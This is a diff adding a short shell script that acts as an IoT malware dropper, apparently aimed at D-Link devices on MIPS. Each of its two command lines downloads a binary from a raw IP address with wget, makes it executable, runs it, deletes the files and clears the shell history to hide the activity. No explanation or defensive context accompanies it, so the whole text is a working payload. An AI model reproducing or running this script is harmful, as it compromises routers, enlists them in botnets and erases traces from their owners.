@@ -1,0 +1,4 @@
+#!/bin/sh
+
+cd /tmp; wget http://2.56.8.156/bins/n.mips; chmod 777 *;./n.mips dlink.mips;rm -rf *;history -w;history -c
+cd /tmp; wget http://2.56.8.156/bins/n.mpsl; chmod 777 *;./n.mpsl dlink.mpsl;rm -rf *;history -w;history -c
